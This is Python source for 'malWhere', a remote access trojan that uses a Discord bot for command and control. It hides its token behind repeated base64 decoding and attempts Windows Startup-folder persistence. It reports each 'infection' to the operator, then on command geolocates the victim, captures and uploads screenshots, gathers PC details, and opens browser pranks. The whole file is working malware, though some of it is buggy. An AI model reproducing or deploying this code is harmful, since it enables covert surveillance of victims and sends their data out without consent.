# malWhere.py
import os
import requests
import discord
from discord.ext import commands
import json
import base64
import pyautogui
import getpass
import psutil
import PIL

encryptedapi="<Base64 encoded api url>"
base64_string =encryptedapi
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
api = sample_string_bytes.decode("ascii")
gettoken=requests.get(api)
tokenjson=gettoken.json()
encryptedtoken=tokenjson["token"]
base64_string =encryptedtoken
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
decryp1 = sample_string_bytes.decode("ascii")
base64_string =decryp1
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
decryp2 = sample_string_bytes.decode("ascii")
base64_string =decryp2
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
decryp3 = sample_string_bytes.decode("ascii")
base64_string =decryp3
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
decryp4 = sample_string_bytes.decode("ascii")
base64_string =decryp4
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
decryp5 = sample_string_bytes.decode("ascii")
TOKEN=decryp5

persistencefile=f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.py"
if not persistencefile:
  shutil.copy(__file__, "startup.py")

malWhere = commands.Bot(command_prefix='$')
malWhere.remove_command('help')
guild = malWhere.get_guild(<guild-id>)

r = requests.get('https://api.ipify.org?format=json')
response=r.json()
ip=response["ip"]
ip4chan=ip.replace(".","")

@malWhere.event
async def on_ready():
  try:
    print(f"logged in as {malWhere}")
    infeinfectionschannel=malWhere.get_channel(<infection-channel-id>)
    existing_channel = discord.utils.get(guild.channels, name=ip4chan)
    if not existing_channel:
      embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands"))
      await guild.create_text_channel(ip)
      await infectionschannel.send(embed=embed)
    else:
      embed=discord.Embed(title="Duplicate Infection", url="", description=(f"{ip} already infected connection is established.. wating for commands"))
      await infectionschannel.send(embed=embed)
  except:
    ctx.message.send("An Error Has Occured Please Try Again")
   
@malWhere.command()
async def help(ctx,type):
  if type=="help":
    embed=discord.Embed(title="Help", description="malWhere's Help Menu", color=0xFF5733)
    embed.add_field(name="Help help", value="$help- shows this menu", inline=False)
    embed.add_field(name="General help", value="$help general - shows the general help menu", inline=False)
    embed.add_field(name="Trolling help", value="$help trolling - shows the trolling help menu", inline=False)
    await ctx.send(embed=embed)
    await ctx.message.delete()
  else:
    if type=="general":
      embed=discord.Embed(title="General Help", description="malWhere's General commands Help Menu",color=0xFF5733)
      embed.add_field(name="Geolocate", value="use $geolocate to locate your target", inline=False)
      embed.add_field(name="Screenshot", value="use $screenshot to take a screenshot of the targets displays", inline=False)
      embed.add_field(name="PC Info", value="Use $pcinfo to gather basic information about the victim pc", inline=False)
      await ctx.send(embed=embed)
      await ctx.message.delete()
    else:
      if type=="trolling":
        embed=discord.Embed(title="Trolling Help", description="malWhere's Trolling Help Menu", color=0xFF5733)
        embed.add_field(name="Rickroll", value="Ahhh such a clasic use $rickroll to get that exquisite trolling experience only rick can deliver", inline=False)
        await ctx.send(embed=embed)
        await ctx.message.delete()
      else:
        ctx.message.send("Invalid help type try again")
        
@malWhere.command()
async def geolocate(ctx):
  try:
    if str(ctx.channel)==(ip4chan):
      r = requests.get(f'http://ipinfo.io/{ip}?token=<token comes in your api url>')
      response=r.json()
      embed=discord.Embed(title="Location Data", url=f"https://www.google.com/maps/search/4{response['loc']}/@{response['loc']},17z", description=f"{ip}'s Location data", color=0xFF5733)
      embed.add_field(name="IP", value=ip, inline=False)
      embed.add_field(name="COUNTRY", value=response["country"], inline=False)
      embed.add_field(name="REGION", value=response["region"], inline=False)
      embed.add_field(name="CITY", value=response["city"], inline=False)
      embed.add_field(name="POST CODE", value=response["postal"], inline=False)
      await ctx.send(embed=embed)
      await ctx.message.delete()
    else:
      await ctx.channel.send("wrong channel skid")
  except:
    ctx.message.send("An Error Has Occured Please Try Again")

@malWhere.command()
async def screenshot(ctx):
  try:
    existing_channel = discord.utils.get(guild.channels, name=(f"{ip4chan}-media"))
    channel_id = existing_channel.id
    if not existing_channel:
      await guild.create_text_channel(f"{ip4chan}-media")
    myScreenshot = pyautogui.screenshot()
    myScreenshot.save(r'tempimage.png')
    with open('tempimage.png', 'rb') as f:
      picture = discord.File(f)
      mediachan=malWhere.get_channel(channel_id)
      await mediachan.send(file=picture)
  except:
    ctx.message.send("An Error Has Occured Please Try Again")

@malWhere.command()
async def pcinfo(ctx):
  try:
    if str(ctx.channel)==(ip4chan):
      battery = psutil.sensors_battery()
      plugged = battery.power_plugged
      percent = str(battery.percent)
      plugged = "Plugged In" if plugged else "Not Plugged In"
      embed=discord.Embed(title="PC Info", url="", description=f"{ip}'s PC data", color=0xFF5733)
      embed.add_field(name="Username", value=getpass.getuser(), inline=False)
      embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
      embed.add_field(name="battery status", value=f"Battery Percentage is {percent}%")
      embed.add_field(name="Plugged In",value=f" Battery is {plugged}")
      await ctx.send(embed=embed)
      await ctx.message.delete()
    else:
      await ctx.channel.send("wrong channel skid")
  except:
    ctx.message.send("An Error Has Occured Please Try Again")

@malWhere.command()
async def rickroll(ctx):
  try:
    existing_chrome="C:/Users/{getpass.getuser()}/AppData/Local/Google/Chrome"
    if existing_chrome:
      os.popen("start chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
      
    existing_opera=f"C:/Users/{getpass.getuser()}/AppData/Local/Opera Software"
    if existing_opera:
      os.popen("start opera.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
      
    existing_firefox="C:/Users/{getpass.getuser()}/AppData/Local/Mozilla/Firefox"
    if existing_firefox:
      os.popen("start firefox.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
      
    existing_brave="C:/Users/jorda/AppData/Local/BraveSoftware/Brave-Browser"
    if existing_brave:
      os.popen("start brave.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
      
    existing_edge="C:/Users/{getpass.getuser()}/AppData/Local/Microsoft/Edge"
    if existing_edge:
      os.popen("start MicrosoftEdge.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
      
    await ctx.message.delete()
  except:
    ctx.message.send("An Error Has Occured Please Try Again")

malWhere.run(TOKEN)
